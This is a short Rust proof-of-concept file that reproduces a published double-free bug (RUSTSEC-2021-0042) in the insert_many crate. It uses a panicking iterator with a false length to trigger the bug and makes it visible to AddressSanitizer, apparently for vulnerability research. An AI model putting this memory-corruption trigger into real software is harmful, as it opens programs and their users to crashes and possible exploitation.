//! Mechanical payload-strengthening adapter for Rudra-PoC 0111,
//! RUSTSEC-2021-0042 (`insert_many` 0.1.1).
//!
//! The published panicking `ExactSizeIterator` path is unchanged. A `Box<u64>`
//! payload turns the duplicated ownership into an ASan-visible double free.

#![forbid(unsafe_code)]

use insert_many::InsertMany;

struct DropDetector(u32, #[allow(dead_code)] Box<u64>);

impl Drop for DropDetector {
    fn drop(&mut self) {
        eprintln!("Dropping {}", self.0);
    }
}

struct PanickingCollection;
struct PanickingIterator;

impl IntoIterator for PanickingCollection {
    type Item = DropDetector;
    type IntoIter = PanickingIterator;

    fn into_iter(self) -> Self::IntoIter {
        PanickingIterator
    }
}

impl Iterator for PanickingIterator {
    type Item = DropDetector;

    fn next(&mut self) -> Option<Self::Item> {
        panic!("published iterator panic");
    }
}

impl ExactSizeIterator for PanickingIterator {
    fn len(&self) -> usize {
        1
    }
}

fn main() {
    let mut values = vec![
        DropDetector(1, Box::new(11)),
        DropDetector(2, Box::new(22)),
    ];
    values.insert_many(0, PanickingCollection);
}
